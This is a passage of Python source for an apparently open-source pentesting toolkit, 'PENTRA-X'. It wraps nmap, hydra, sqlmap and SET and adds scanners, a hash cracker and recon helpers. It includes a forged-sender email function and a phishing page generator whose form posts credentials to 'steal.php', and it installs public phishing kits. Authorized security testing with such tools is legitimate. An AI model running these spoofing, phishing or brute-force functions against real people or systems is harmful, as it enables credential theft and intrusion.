# pentraX_wsl.py - Full Pentesting Toolkit 
# Minimal imports for logo/disclaimer
import sys
import time

# Add color output utilities
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def typewriter(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

def animated_print(text, delay=0.03):
    for line in text.splitlines():
        print(line)
        time.sleep(delay)

BANNER = f"""
{Colors.OKCYAN}
██████╗ ███████╗███╗   ██╗████████╗██████╗  █████╗ ██╗  ██╗
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗██╔╝
██████╔╝█████╗  ██╔██╗ ██║   ██║   ██████╔╝███████║ ╚███╔╝ 
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔═══╝ ██╔══██║ ██╔██╗ 
██║     ███████╗██║ ╚████║   ██║   ██║     ██║  ██║██╔╝ ██╗
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝
              FULL PENTEST TOOLKIT (V1.2.1)

         {Colors.BOLD}Created by 0xP4X{Colors.ENDC}{Colors.OKCYAN}
         GitHub: https://github.com/0xP4X/
"""

DISCLAIMER = f"""
{Colors.WARNING}{Colors.BOLD}DISCLAIMER:{Colors.ENDC}{Colors.WARNING}
This toolkit is for educational and authorized penetration testing use only.
Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.
By using this toolkit, you agree to comply with all applicable laws and regulations.
The author assumes no liability for misuse or damage caused by this software.
{Colors.ENDC}
"""

# Show logo and disclaimer for all users
animated_print(BANNER, delay=0.03)
print()
typewriter(DISCLAIMER, delay=0.01)
print()

# Now check platform
if not sys.platform.startswith('linux'):
    print("\n[!] PENTRA-X is only supported on Linux.\nPlease use a Linux system (Kali, Parrot, Ubuntu, etc.) for full functionality.\n")
    sys.exit(1)

# All other imports below...
import subprocess
import socket
import requests
import hashlib
import os
import ssl
import json
import threading
import shutil
import signal
import sys
from urllib.parse import urlparse
import re
from datetime import datetime
import curses

def cprint(text, color):
    print(f"{color}{text}{Colors.ENDC}")

def animated_print(text, delay=0.03):
    for line in text.splitlines():
        print(line)
        time.sleep(delay)

def typewriter(text, delay=0.01):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)

def safe_subprocess_run(cmd, **kwargs):
    """Run subprocess command with proper cleanup tracking"""
    try:
        process = subprocess.Popen(cmd, **kwargs)
        running_processes.append(process)
        result = process.communicate()
        running_processes.remove(process)
        return subprocess.CompletedProcess(cmd, process.returncode, result[0], result[1])
    except Exception as e:
        print(f"{Colors.FAIL}[-] Subprocess error: {e}{Colors.ENDC}")
        return None

def safe_subprocess_run_with_output(cmd, **kwargs):
    """Run subprocess command with real-time output and CTRL+C handling"""
    try:
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, 
                                 text=True, **kwargs)
        running_processes.append(process)
        
        # Read output in real-time
        for line in process.stdout:
            print(line, end='', flush=True)
        
        process.wait()
        running_processes.remove(process)
        return process.returncode == 0
        
    except KeyboardInterrupt:
        if 'process' in locals():
            print(f"\n{Colors.WARNING}[!] Terminating process...{Colors.ENDC}")
            process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
            running_processes.remove(process)
        return False
    except Exception as e:
        print(f"{Colors.FAIL}[-] Subprocess error: {e}{Colors.ENDC}")
        if 'process' in locals() and process in running_processes:
            running_processes.remove(process)
        return False

def safe_input(prompt=""):
    """Get user input with CTRL+C handling"""
    try:
        return input(prompt)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Input cancelled by user{Colors.ENDC}")
        return None

def run_with_interrupt_handling(func, *args, **kwargs):
    """Run a function with proper CTRL+C handling"""
    try:
        return func(*args, **kwargs)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Operation cancelled by user{Colors.ENDC}")
        return None
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Error during operation: {e}{Colors.ENDC}")
        return None

def safe_press_enter(prompt="\n[Press Enter to return to the menu]"):
    """Safe 'Press Enter' prompt with CTRL+C handling"""
    try:
        input(prompt)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Returning to menu...{Colors.ENDC}")
        return

def run_long_operation(operation_name, operation_func, *args, **kwargs):
    """Run a long operation with proper CTRL+C handling and progress indication"""
    print(f"{Colors.OKBLUE}[*] Starting {operation_name}...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press Ctrl+C to cancel at any time{Colors.ENDC}")
    
    try:
        # Create a spinner for the operation
        spinner = Spinner(f"Running {operation_name}")
        spinner.start()
        
        # Run the operation
        result = operation_func(*args, **kwargs)
        
        spinner.stop()
        print(f"{Colors.OKGREEN}[+] {operation_name} completed successfully{Colors.ENDC}")
        return result
        
    except KeyboardInterrupt:
        if 'spinner' in locals():
            spinner.stop()
        print(f"\n{Colors.WARNING}[!] {operation_name} cancelled by user{Colors.ENDC}")
        return None
    except Exception as e:
        if 'spinner' in locals():
            spinner.stop()
        print(f"\n{Colors.FAIL}[!] {operation_name} failed: {e}{Colors.ENDC}")
        return None

class Spinner:
    def __init__(self, message="Working..."):
        self.spinner = ['|', '/', '-', '\\']
        self.idx = 0
        self.running = False
        self.thread = None
        self.message = message
        # Register with global active spinners
        active_spinners.append(self)
    
    def start(self):
        self.running = True
        def spin():
            while self.running:
                print(f"\r{self.message} {self.spinner[self.idx % len(self.spinner)]}", end='', flush=True)
                self.idx += 1
                time.sleep(0.1)
        self.thread = threading.Thread(target=spin)
        self.thread.start()
    
    def stop(self):
        self.running = False
        if self.thread:
            self.thread.join()
        print("\r" + " " * (len(self.message) + 4) + "\r", end='')
        # Remove from active spinners
        if self in active_spinners:
            active_spinners.remove(self)

def print_menu_with_header(menu_text):
    print(BANNER)
    print(DISCLAIMER)
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
    print(color_menu_numbers(menu_text))
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)

def print_menu_no_clear(menu_text):
    print(BANNER)
    print(DISCLAIMER)
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)
    print(color_menu_numbers(menu_text))
    print(Colors.OKCYAN + "-"*60 + Colors.ENDC)

# Utility to color menu numbers (e.g., '1.', '2.', etc.) in cyan
import re
def color_menu_numbers(menu_text):
    # Replace numbers at the start of lines (e.g., '1.', '2.') with colored versions
    def repl(match):
        return f"{Colors.OKCYAN}{match.group(0)}{Colors.ENDC}"
    return re.sub(r"^\s*\d+\. ", repl, menu_text, flags=re.MULTILINE)

def check_and_prompt_dependencies():
    """Check for required dependencies, list missing ones, and prompt user for installation options."""
    print(f"{Colors.OKCYAN}[+] Dependency Checker{Colors.ENDC}")
    
    # Define all required tools
    system_packages = [
        "git", "curl", "wget", "python3", "python3-pip", "build-essential",
        "libssl-dev", "libffi-dev", "python3-dev", "ruby", "ruby-dev",
        "nodejs", "npm", "go", "rustc", "cargo"
    ]
    package_tools = [
        "nmap", "hydra", "sqlmap", "gobuster", "arp-scan", "whois", "dig",
        "aircrack-ng", "wifite", "reaver", "hcxdumptool", "hcxpcapngtool",
        "ettercap", "bettercap", "dirb", "nikto", "whatweb", "theharvester",
        "recon-ng", "maltego"
    ]
    python_tools = [
        "setoolkit", "requests", "beautifulsoup4", "lxml", "selenium", "scapy",
        "cryptography", "paramiko", "netaddr", "dnspython", "python-nmap",
        "python-whois", "shodan", "censys", "virustotal-api", "haveibeenpwned",
        "tweepy", "facebook-sdk", "linkedin-api", "instagram-scraper"
]
    github_tools = [
        ("BlackEye", "/opt/BlackEye/blackeye.sh"),
        ("SocialFish", "/opt/SocialFish/SocialFish.py"),
        ("HiddenEye", "/opt/HiddenEye/HiddenEye.py"),
        ("Wifiphisher", "/opt/wifiphisher/wifiphisher.py"),
        ("Sherlock", "/opt/sherlock/sherlock.py"),
        ("Photon", "/opt/Photon/photon.py"),
        ("Subfinder", "/opt/subfinder/subfinder"),
        ("Amass", "/opt/amass/amass"),
        ("Nuclei", "/opt/nuclei/nuclei"),
        ("httpx", "/opt/httpx/httpx"),
        ("Naabu", "/opt/naabu/naabu"),
        ("TheHarvester", "/opt/theHarvester/theHarvester.py"),
        ("Recon-ng", "/opt/recon-ng/recon-ng"),
        ("Maltego", "/opt/maltego-trx/maltego-trx"),
    ]
    
    missing = []
    # Check system/package tools
    for tool in package_tools:
        if shutil.which(tool) is None:
            missing.append((tool, "system"))
    # Check Python tools
    for tool in python_tools:
        try:
            __import__(tool.replace('-', '_').replace('python-', '').replace('beautifulsoup4', 'bs4'))
        except ImportError:
            missing.append((tool, "python"))
    # Check GitHub tools
    for name, path in github_tools:
        if not os.path.exists(path):
            missing.append((name, "github"))
    
    if not missing:
        print(f"{Colors.OKGREEN}[+] All dependencies are installed!{Colors.ENDC}")
        return
    
    print(f"{Colors.FAIL}[!] Missing dependencies:{Colors.ENDC}")
    
    # Group missing dependencies by type
    system_missing = [tool for tool, typ in missing if typ == "system"]
    python_missing = [tool for tool, typ in missing if typ == "python"]
    github_missing = [tool for tool, typ in missing if typ == "github"]
    
    # Display in table format with colored headers and missing tools
    if system_missing or python_missing or github_missing:
        # Calculate column widths (add 2 for padding)
        system_width = max(len("System Tools"), *(len(tool) for tool in system_missing)) + 2 if system_missing else 0
        python_width = max(len("Python Packages"), *(len(tool) for tool in python_missing)) + 2 if python_missing else 0
        github_width = max(len("GitHub Tools"), *(len(tool) for tool in github_missing)) + 2 if github_missing else 0
        
        # Table header
        header_line = "┌" + "─" * system_width + "┬" + "─" * python_width + "┬" + "─" * github_width + "┐"
        print("  " + header_line)
        
        # Print column headers in yellow
        headers = []
        headers.append(f"│ {Colors.WARNING}{'System Tools':^{system_width-2}}{Colors.ENDC} ")
        headers.append(f"│ {Colors.WARNING}{'Python Packages':^{python_width-2}}{Colors.ENDC} ")
        headers.append(f"│ {Colors.WARNING}{'GitHub Tools':^{github_width-2}}{Colors.ENDC} │")
        print("".join(headers))
        
        # Separator
        separator = "├" + "─" * system_width + "┼" + "─" * python_width + "┼" + "─" * github_width + "┤"
        print("  " + separator)
        
        # Print tools in rows, each tool in red, with padding
        max_rows = max(len(system_missing), len(python_missing), len(github_missing))
        for i in range(max_rows):
            row = []
            if i < len(system_missing):
                row.append(f"│ {Colors.FAIL}{system_missing[i]:<{system_width-2}}{Colors.ENDC} ")
            else:
                row.append(f"│ {' ' * (system_width-1)}")
            if i < len(python_missing):
                row.append(f"│ {Colors.FAIL}{python_missing[i]:<{python_width-2}}{Colors.ENDC} ")
            else:
                row.append(f"│ {' ' * (python_width-1)}")
            if i < len(github_missing):
                row.append(f"│ {Colors.FAIL}{github_missing[i]:<{github_width-2}}{Colors.ENDC} │")
            else:
                row.append(f"│ {' ' * (github_width-1)}│")
            print("".join(row))
        
        # Bottom border
        bottom_line = "└" + "─" * system_width + "┴" + "─" * python_width + "┴" + "─" * github_width + "┘"
        print("  " + bottom_line)
    
    print()
    print(f"{Colors.WARNING}Options:{Colors.ENDC}")
    print(f"  1. Install ALL missing dependencies")
    print(f"  2. Select which to install")
    print(f"  3. Skip installation (not recommended)")
    choice = input(f"{Colors.OKBLUE}Choose an option [1/2/3]: {Colors.ENDC}").strip()
    to_install = []
    if choice == "1":
        to_install = missing
    elif choice == "2":
        print(f"{Colors.OKCYAN}Enter numbers separated by comma (e.g. 1,3,5):{Colors.ENDC}")
        for idx, (tool, typ) in enumerate(missing, 1):
            print(f"  {idx}. {tool} ({typ})")
        sel = input(f"{Colors.OKBLUE}Select: {Colors.ENDC}").strip()
        try:
            nums = [int(x) for x in sel.split(",") if x.strip().isdigit()]
            to_install = [missing[i-1] for i in nums if 1 <= i <= len(missing)]
        except Exception:
            print(f"{Colors.FAIL}Invalid selection. Skipping installation.{Colors.ENDC}")
            return
    else:
        print(f"{Colors.WARNING}Skipping dependency installation. Some tools may not work!{Colors.ENDC}")
        return
    # Install selected tools
    for tool, typ in to_install:
        print(f"{Colors.OKBLUE}[*] Installing {tool} ({typ})...{Colors.ENDC}")
        if typ == "system":
            subprocess.run(["sudo", "apt", "install", "-y", tool])
        elif typ == "python":
            subprocess.run([sys.executable, "-m", "pip", "install", tool])
        elif typ == "github":
            # Find repo URL for this tool (hardcoded for now)
            repo_map = {
                "BlackEye": "https://github.com/thelinuxchoice/blackeye.git",
                "SocialFish": "https://github.com/UndeadSec/SocialFish.git",
                "HiddenEye": "https://github.com/DarkSecDevelopers/HiddenEye.git",
                "Wifiphisher": "https://github.com/wifiphisher/wifiphisher.git",
                "Sherlock": "https://github.com/sherlock-project/sherlock.git",
                "Photon": "https://github.com/s0md3v/Photon.git",
                "Subfinder": "https://github.com/projectdiscovery/subfinder.git",
                "Amass": "https://github.com/owasp-amass/amass.git",
                "Nuclei": "https://github.com/projectdiscovery/nuclei.git",
                "httpx": "https://github.com/projectdiscovery/httpx.git",
                "Naabu": "https://github.com/projectdiscovery/naabu.git",
                "TheHarvester": "https://github.com/laramies/theHarvester.git",
                "Recon-ng": "https://github.com/lanmaster53/recon-ng.git",
                "Maltego": "https://github.com/paterva/maltego-trx.git",
            }
            repo = repo_map.get(tool)
            if repo:
                subprocess.run(["sudo", "git", "clone", repo, f"/opt/{tool}"])
            else:
                print(f"{Colors.FAIL}No repo URL for {tool}. Please install manually.{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Dependency installation complete!{Colors.ENDC}")

def ensure_installed(cmd_name, install_cmd):
    """Enhanced tool installation checker"""
    if shutil.which(cmd_name) is None:
        print(f"{Colors.WARNING}[!] {cmd_name} not found. Installing...{Colors.ENDC}")
        
        # Try different installation methods
        install_methods = [
            ["sudo", "apt", "install", "-y", install_cmd],
            [sys.executable, "-m", "pip", "install", install_cmd],
            ["sudo", "gem", "install", install_cmd],
            ["go", "install", install_cmd],
        ]
        
        for method in install_methods:
            try:
                result = subprocess.run(method, capture_output=True, text=True)
                if result.returncode == 0:
                    print(f"{Colors.OKGREEN}[+] {cmd_name} installed successfully!{Colors.ENDC}")
                    return
            except Exception:
                continue
        
        print(f"{Colors.FAIL}[-] Failed to install {cmd_name}. Please install manually.{Colors.ENDC}")
        return False
    
    return True

def check_root():
    if os.geteuid() != 0:
        print("[!] This action requires root privileges. Please run as root or with sudo.")
        return False
    return True

def check_monitor_mode(iface):
    # Simple check for monitor mode
    try:
        output = subprocess.getoutput(f"iwconfig {iface}")
        if "Mode:Monitor" not in output:
            print(f"[!] Interface {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
            return False
    except Exception:
        print(f"[!] Could not check monitor mode for {iface}.")
        return False
    return True

def log_result(name, data):
    with open(f"results_{name}.txt", "a") as f:
        f.write(f"[{datetime.now().isoformat()}] {data}\n")

# ARP Scan
def arp_scan():
    ensure_installed("arp-scan", "arp-scan")
    cprint("[+] Scanning local network for live hosts (requires sudo)...", Colors.OKBLUE)
    try:
        result = subprocess.run(["sudo", "arp-scan", "-l"], capture_output=True, text=True)
        if result.returncode != 0:
            cprint("[-] arp-scan failed. Are you running with sudo?", Colors.FAIL)
            cprint(result.stderr, Colors.FAIL)
            return
        print(result.stdout)
        # Parse live hosts
        hosts = []
        for line in result.stdout.splitlines():
            if line and ":" in line and "." in line.split()[0]:
                hosts.append(line)
        if hosts:
            cprint(f"[+] Found {len(hosts)} live hosts:", Colors.OKGREEN)
            for h in hosts:
                print(h)
            log_result("arp", "\n".join(hosts))
        else:
            cprint("[!] No live hosts found.", Colors.WARNING)
    except Exception as e:
        cprint(f"[-] Error running arp-scan: {e}", Colors.FAIL)

# Nmap Wrapper
def nmap_scan(target):
    ensure_installed("nmap", "nmap")
    def is_valid_ip(ip):
        import re
        return re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", ip) or re.match(r"^[a-zA-Z0-9.-]+$", ip)
    if not is_valid_ip(target):
        print("[-] Invalid target. Enter a valid IP address or hostname.")
        return
    print(f"\n[+] Running Nmap scan on {target}")
    help_text = '''\nNmap Advanced Options Help:
- Service/version:        -sV
- OS detection:           -O
- Stealth SYN scan:       -sS
- UDP scan:               -sU
- Aggressive:             -A
- Top 1000 ports:         --top-ports 1000
- All ports:              -p- 
- NSE scripts:            --script=default,vuln
- Custom script:          --script=/path/to/script.nse
- Output to file:         -oN result.txt
- Timing:                 -T4
- Firewall evasion:       -f, --data-length, --source-port
- Example:                -sS -A -T4 --script=default,vuln -oN scan.txt
'''
    presets = [
        ("1. Quick scan (top 1000 ports)", "--top-ports 1000"),
        ("2. Full TCP scan (all ports)", "-p-"),
        ("3. Service/version detection", "-sV"),
        ("4. OS detection", "-O"),
        ("5. Aggressive scan (OS, version, script, traceroute)", "-A"),
        ("6. Vulnerability scripts", "--script=vuln"),
        ("7. Default scripts", "--script=default"),
        ("8. Custom script", None),
        ("9. Custom options (manual entry)", None),
        ("h. Show help/examples", None),
        ("0. Cancel", None)
    ]
    while True:
        print("\nNmap Scan Presets:")
        for label, _ in presets:
            print(f"  {label}")
        choice = input("Select preset or enter 'h' for help, '9' for custom options: ").strip()
        if choice == "0":
            return
        elif choice == "h":
            print(help_text)
            continue
        elif choice == "1":
            options = "--top-ports 1000"
        elif choice == "2":
            options = "-p-"
        elif choice == "3":
            options = "-sV"
        elif choice == "4":
            options = "-O"
        elif choice == "5":
            options = "-A"
        elif choice == "6":
            options = "--script=vuln"
        elif choice == "7":
            options = "--script=default"
        elif choice == "8":
            script = input("Enter NSE script name or path (e.g. default,vuln or /path/to/script.nse): ").strip()
            options = f"--script={script}"
        elif choice == "9":
            options = input("Enter full Nmap options (e.g. -sS -A -T4 --script=default,vuln): ").strip() or "-A"
        else:
            print("Invalid choice.")
            continue
        break
    spinner = Spinner("Scanning with Nmap")
    spinner.start()
    result = subprocess.run(["nmap"] + options.split() + [target], capture_output=True, text=True)
    spinner.stop()
    print(result.stdout)
    # Highlight open ports
    open_ports = []
    for line in result.stdout.splitlines():
        if "/tcp" in line and "open" in line:
            print(f"[OPEN] {line}")
            open_ports.append(line)
    log_result("nmap", result.stdout)
    if not open_ports:
        print("[!] No open ports found by Nmap.")

# Hydra Wrapper
def hydra_scan(ip, username, service):
    ensure_installed("hydra", "hydra")
    wordlist = input("Hydra wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    if os.path.exists(wordlist + ".gz"):
        subprocess.run(["gunzip", wordlist + ".gz"])
    print("\n[+] Brute-force login with Hydra")
    print(f"[+] Target: {ip} | User: {username} | Service: {service}")
    result = subprocess.run(["hydra", "-l", username, "-P", wordlist, f"{ip}", service], capture_output=True, text=True)
    print(result.stdout)
    # Show found passwords
    found = []
    for line in result.stdout.splitlines():
        if "login:" in line and "password:" in line:
            print(f"[FOUND] {line}")
            found.append(line)
    log_result("hydra", result.stdout)
    if not found:
        print("[!] No valid credentials found by Hydra.")

# SQLMap Wrapper
def sqlmap_scan(url):
    ensure_installed("sqlmap", "sqlmap")
    print("\n[+] Testing SQL Injection on target")
    options = input("SQLMap options (default --batch --crawl=1): ").strip() or "--batch --crawl=1"
    result = subprocess.run(["sqlmap", "-u", url] + options.split(), capture_output=True, text=True)
    print(result.stdout)
    # Show found vulnerabilities
    found = []
    for line in result.stdout.splitlines():
        if "is vulnerable" in line or "parameter" in line:
            print(f"[VULN] {line}")
            found.append(line)
    log_result("sqlmap", result.stdout)
    if not found:
        print("[!] No SQLi vulnerabilities found by SQLMap.")

# SEToolkit Wrapper (Social Engineering)
def setoolkit():
    ensure_installed("set", "set")
    print("\n[!] WARNING: Use the Social Engineering Toolkit (SET) only for authorized, ethical testing.")
    print("[!] SET requires sudo/root permissions.")
    print("[+] Launching Social Engineering Toolkit...")
    subprocess.run(["sudo", "setoolkit"])

# Fake Email Sender (Local spoof test only)
def spoof_email():
    import re
    def valid_email(addr):
        return re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", addr)
    sender = input("From (fake): ")
    recipient = input("To (real): ")
    if not valid_email(sender) or not valid_email(recipient):
        print("[-] Invalid email address format.")
        return
    subject = input("Subject: ")
    body = input("Body: ")
    print("\n[!] This will attempt to send mail using your system's sendmail or configured relay.")
    message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
    if shutil.which("sendmail") is None:
        print("[-] sendmail not found. Install with: sudo apt install sendmail")
        print("[!] Here is the raw email content. You can try sending it manually:")
        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
        return
    try:
        result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
        if result.returncode == 0:
            print("[+] Spoofed email sent.")
            log_result("spoofmail", f"From: {sender} To: {recipient} Subject: {subject}")
        else:
            print(f"[-] sendmail failed: {result.stderr}")
            print("[!] Troubleshooting: Ensure sendmail is configured and your system allows local mail delivery.")
            print("[!] Here is the raw email content. You can try sending it manually:")
            print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")
        print("[!] Troubleshooting: Ensure sendmail is installed and configured. Try running 'sudo apt install sendmail'.")
        print("[!] Here is the raw email content. You can try sending it manually:")
        print("\n--- RAW EMAIL ---\n" + message + "\n--- END ---\n")

# Phishing Page Generator (Static HTML)
def phishing_page():
    folder = "phish_page"
    os.makedirs(folder, exist_ok=True)
    print("[!] WARNING: Use phishing pages only for authorized, ethical testing.")
    use_custom = input("Use custom HTML template? (y/N): ").strip().lower() == 'y'
    if use_custom:
        html = input("Paste your custom HTML (end with a single line containing only END):\n")
        lines = []
        while True:
            line = input()
            if line.strip() == "END":
                break
            lines.append(line)
        html = "\n".join(lines)
    else:
        title = input("Page title: ")
        prompt = input("Prompt text (e.g. Enter your password): ")
        html = f"""
        <html><head><title>{title}</title></head>
        <body>
        <h2>{prompt}</h2>
        <form method='POST' action='steal.php'>
            <input name='user' placeholder='Username'><br>
            <input name='pass' type='password' placeholder='Password'><br>
            <input type='submit'>
        </form></body></html>
        """
    with open(os.path.join(folder, "index.html"), "w") as f:
        f.write(html)
    print(f"[+] Phishing page saved to ./{folder}/index.html")

# Port Scan (basic, using socket)
def port_scan(ip):
    print(f"[+] Port Scan - Scanning {ip}")
    print("[!] Choose scan type:")
    print("1. Quick scan (common ports 1-1024)")
    print("2. Full scan (all ports 1-65535)")
    print("3. Custom range")
    print("4. Common service ports only")
    
    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
    
    if choice == "1":
        start, end = 1, 1024
        print(f"[+] Quick scan: ports {start}-{end}")
    elif choice == "2":
        start, end = 1, 65535
        print(f"[+] Full scan: ports {start}-{end} (this will take a while)")
    elif choice == "3":
        try:
            port_range = input("Port range (e.g. 20-1024): ").strip()
            if '-' in port_range:
                start, end = map(int, port_range.split('-'))
                if start < 1 or end > 65535 or start > end:
                    print("[-] Invalid port range. Using 1-1024.")
                    start, end = 1, 1024
            else:
                print("[-] Invalid format. Using 1-1024.")
                start, end = 1, 1024
        except Exception:
            print("[-] Invalid input. Using 1-1024.")
            start, end = 1, 1024
    elif choice == "4":
        # Common service ports
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5900, 8080]
        print(f"[+] Common service scan: {len(common_ports)} ports")
        open_ports = []
        for port in common_ports:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            try:
                s.connect((ip, port))
                banner = ""
                try:
                    s.sendall(b'\r\n')
                    banner = s.recv(1024).decode(errors='ignore').strip()
                except:
                    pass
                service = get_service_name(port)
                print(f"[OPEN] Port {port} ({service}) {'- ' + banner if banner else ''}")
                open_ports.append(f"{port} {service} {banner}")
                log_result("portscan", f"{ip}:{port} {service} OPEN {banner}")
            except:
                pass
            finally:
                s.close()
        
        if not open_ports:
            print("[!] No open ports found.")
        else:
            print(f"[+] Found {len(open_ports)} open ports.")
        return
    else:
        print("[-] Invalid choice. Using quick scan.")
        start, end = 1, 1024
    
    print(f"[+] Scanning ports {start}-{end} on {ip}")
    print("[*] This may take a while...")
    
    open_ports = []
    total_ports = end - start + 1
    scanned = 0
    
    for port in range(start, end + 1):
        scanned += 1
        if scanned % 100 == 0:
            progress = (scanned / total_ports) * 100
            print(f"[*] Progress: {progress:.1f}% ({scanned}/{total_ports})")
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        try:
            s.connect((ip, port))
            banner = ""
            try:
                s.sendall(b'\r\n')
                banner = s.recv(1024).decode(errors='ignore').strip()
            except:
                pass
            service = get_service_name(port)
            print(f"[OPEN] Port {port} ({service}) {'- ' + banner if banner else ''}")
            open_ports.append(f"{port} {service} {banner}")
            log_result("portscan", f"{ip}:{port} {service} OPEN {banner}")
        except:
            pass
        finally:
            s.close()
    
    if not open_ports:
        print("[!] No open ports found in range.")
    else:
        print(f"[+] Found {len(open_ports)} open ports.")

def get_service_name(port):
    """Get common service name for port"""
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
        110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 993: "IMAPS", 995: "POP3S", 1723: "PPTP", 3306: "MySQL",
        3389: "RDP", 5900: "VNC", 8080: "HTTP-Proxy"
    }
    return services.get(port, "Unknown")

# Whois Lookup
def whois_lookup(domain):
    ensure_installed("whois", "whois")
    print(f"[+] Whois lookup for {domain}")
    result = subprocess.getoutput(f"whois {domain}")
    print(result)
    # Highlight key fields
    highlights = []
    for line in result.splitlines():
        if any(key in line.lower() for key in ["registrar", "creation date", "expiry", "expiration", "name server", "status", "updated date"]):
            highlights.append(line)
    if highlights:
        print("\n[+] Key Whois Info:")
        for h in highlights:
            print(h)
    log_result("whois", result)

# HTTP Headers Grabber
def headers_grabber(url):
    try:
        follow = input("Follow redirects? (y/N): ").strip().lower() == 'y'
        start = time.time()
        r = requests.get(url, allow_redirects=follow)
        elapsed = time.time() - start
        print(f"[+] Status: {r.status_code} | Time: {elapsed:.2f}s")
        print(f"[+] Headers for {url}:")
        for k, v in r.headers.items():
            print(f"{k}: {v}")
        if r.history:
            print("[!] Redirect chain:")
            for resp in r.history:
                print(f"  {resp.status_code} -> {resp.url}")
        log_result("headers", f"{url}\nStatus: {r.status_code}\nHeaders: {dict(r.headers)}\nTime: {elapsed:.2f}s")
    except Exception as e:
        print(f"[-] Error: {e}")

# Crack SHA256 Hash (simple wordlist attack)
def crack_hash(h):
    wordlist = input("Wordlist path (default /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    hash_type = input("Hash type (sha256/sha1/md5, default sha256): ").strip().lower() or "sha256"
    if not os.path.exists(wordlist):
        print(f"[-] Wordlist not found: {wordlist}")
        return
    print(f"[+] Cracking {hash_type} hash using {wordlist} ...")
    hash_func = hashlib.sha256
    if hash_type == "md5":
        hash_func = hashlib.md5
    elif hash_type == "sha1":
        hash_func = hashlib.sha1
    found = False
    with open(wordlist, "rb") as f:
        for i, word in enumerate(f, 1):
            word = word.strip()
            if hash_func(word).hexdigest() == h:
                print(f"[+] Hash cracked: {word.decode()}")
                log_result("crackhash", f"{h} = {word.decode()}")
                found = True
                break
            if i % 100000 == 0:
                print(f"  ...{i} words tried...")
    if not found:
        print("[-] Hash not found in wordlist.")

# DNS Lookup
def dns_lookup(domain):
    import subprocess
    print(f"[+] DNS lookup for {domain}")
    records = {}
    for rtype in ["A", "AAAA", "MX", "TXT"]:
        try:
            result = subprocess.getoutput(f"dig +short {domain} {rtype}")
            if result.strip():
                records[rtype] = result.strip().splitlines()
        except Exception as e:
            print(f"[-] Error fetching {rtype} records: {e}")
    if records:
        for rtype, values in records.items():
            print(f"{rtype} records:")
            for v in values:
                print(f"  {v}")
        log_result("dns", f"{domain}: {records}")
    else:
        print("[-] No DNS records found.")

# SSL Certificate Info
def ssl_info(domain):
    ctx = ssl.create_default_context()
    with ctx.wrap_socket(socket.socket(), server_hostname=domain) as s:
        try:
            s.connect((domain, 443))
            cert = s.getpeercert()
            if not isinstance(cert, dict):
                print("[-] Could not retrieve certificate details.")
                return
            print(f"[+] SSL cert for {domain}:")
            subject = {k: v for t in cert['subject'] for k, v in t} if 'subject' in cert else {}
            issuer = {k: v for t in cert['issuer'] for k, v in t} if 'issuer' in cert else {}
            print(f"  Subject: {subject}")
            print(f"  Issuer: {issuer}")
            exp = cert['notAfter'] if 'notAfter' in cert else None
            print(f"  Expiry: {exp}")
            # Warn if expired or self-signed
            import datetime
            if exp and isinstance(exp, str):
                try:
                    exp_dt = datetime.datetime.strptime(exp, '%b %d %H:%M:%S %Y %Z')
                    if exp_dt < datetime.datetime.utcnow():
                        print("[!] Certificate is EXPIRED!")
                except Exception:
                    pass
            if subject and issuer and subject == issuer:
                print("[!] Certificate is self-signed!")
            log_result("ssl", json.dumps(cert))
        except Exception as e:
            print(f"[-] Error: {e}")

# Subdomain Finder (basic, using wordlist)
def find_subdomains(domain):
    wordlist = input("Subdomain wordlist path (default /usr/share/wordlists/subdomains-top1million-5000.txt): ").strip() or "/usr/share/wordlists/subdomains-top1million-5000.txt"
    if not os.path.exists(wordlist):
        print("[-] Subdomain wordlist not found!")
        return
    print(f"[+] Finding subdomains for {domain}")
    found = []
    with open(wordlist) as f:
        for i, sub in enumerate(f, 1):
            sub = sub.strip()
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                print(f"[FOUND] {subdomain}")
